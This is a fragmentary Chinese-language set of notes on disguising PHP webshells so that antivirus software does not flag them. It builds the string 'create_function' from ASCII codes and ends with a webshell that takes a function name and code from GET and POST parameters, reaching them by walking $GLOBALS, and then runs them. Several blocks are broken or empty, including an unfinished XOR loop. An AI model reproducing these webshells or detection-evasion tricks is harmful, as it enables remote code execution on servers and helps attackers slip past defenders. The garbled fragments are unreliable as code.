##### 函数取别名

```

?>

##### 利用数组转换需要的函数

```
<?php 
// create\_function
$num \= array(99 ,114 ,101 ,97 ,116 ,101 ,95 ,102 ,117 ,110 ,99 ,116 ,105 ,111,110);
$num2 \= array();
// chr()转换ascii
for($i \= 0;$i<count($num);$i++){
$num2\[$i\] \= chr($num\[$i\]);
}
$str \= '';
// 数组转换字符串
$str \= implode($str, $num2);

##### 利用全局变量遍历获取想要全局变量(手动滑天下之大稽)（组合拳）

```

?>

异或代码

```
import string

for i in range(len(a)):
    for j in range(len(a)):

##### 接收变量

这个报毒喔，尝试怎么绕过这个鬼东西。

```
<?php 
$a \= $\_GET\['x'\];
$b \= $\_GET\['a'\];
$a($b);
?>
```

尝试绕过后的代码，`eval`，`assert`这两个函数是我太菜了，我调试不出来。统一用create_function做演示。

```
<?php 
// 接收的还是create\_function
$g \= '';
$p \= '';
foreach ($GLOBALS as $key \=> $value) {
if($key \== '\_GET'){
$g \= $$key\['g'\];
}elseif($key \== '\_POST'){
$p \= $$key\['x'\];
}
}
$a \= $g;
$a("",$p)();
?>
```
